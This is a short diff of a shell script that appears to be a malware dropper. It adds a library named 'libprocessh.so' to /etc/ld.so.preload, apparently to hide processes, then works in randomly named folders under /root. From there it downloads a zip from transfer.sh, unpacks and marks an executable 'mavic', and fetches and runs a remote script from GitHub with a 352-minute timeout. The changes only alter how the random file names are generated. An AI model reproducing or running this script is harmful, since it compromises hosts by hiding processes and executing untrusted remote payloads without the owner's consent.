@@ -7,14 +7,14 @@ sudo mv libprocessh.so /usr/local/lib/
 echo /usr/local/lib/libprocessh.so >> /etc/ld.so.preload 
 cd /root 
 fol=$(openssl rand -base64 6)
-ra3=$(openssl rand -base64 7)
+ra3=$(openssl rand -hex 5)
 mkdir $fol
 cd $fol
-z3=$(openssl rand -base64 3)
-wget http://transfer.sh/H8t4Pk/mav.zip -O $z3.zip
-unzip $z3.zip 
+z3=$(openssl rand -hex 3)
+wget http://transfer.sh/H8t4Pk/mav.zip -O ty$z3.zip
+unzip ty$z3.zip 
 chmod 777 mavic 
-rm $z3.zip
+rm ty$z3.zip
 wget https://github.com/Mafs68/hjs839/raw/main/mai2.sh -O $ra3.sh
 chmod 777 $ra3.sh
 timeout 352m ./$ra3.sh
